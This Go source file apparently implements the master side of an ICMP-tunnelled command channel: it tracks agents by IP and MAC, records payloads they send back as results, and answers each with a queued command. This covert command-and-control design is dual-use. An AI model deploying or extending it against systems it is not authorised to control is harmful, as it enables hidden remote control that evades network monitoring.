package app

import (
	"context"

	"protocol/icmp/internal/protocol"
	"protocol/icmp/internal/transport"
)

type CommandSource interface {
	NextCommand(context.Context, string) ([]byte, error)
}

type ResultSink interface {
	WriteResult(string, []byte) error
}

type AgentTracker interface {
	TouchAgent(agentIP string, mac string)
}

type MasterService struct {
	Responder transport.MasterResponder
	Commands  CommandSource
	Results   ResultSink
	Agents    AgentTracker
}

func (s MasterService) Run(ctx context.Context) error {
	return s.Responder.Serve(ctx, func(ctx context.Context, req protocol.RequestContext) ([]byte, error) {
		agentIP := req.Meta.SrcIP.String()
		if s.Agents != nil {
			s.Agents.TouchAgent(agentIP, req.Meta.SrcMAC.String())
		}
		if len(req.Exchange.Payload) > 0 && s.Results != nil {
			if err := s.Results.WriteResult(agentIP, req.Exchange.Payload); err != nil {
				return nil, err
			}
		}
		if s.Commands == nil {
			return nil, nil
		}
		return s.Commands.NextCommand(ctx, agentIP)
	})
}
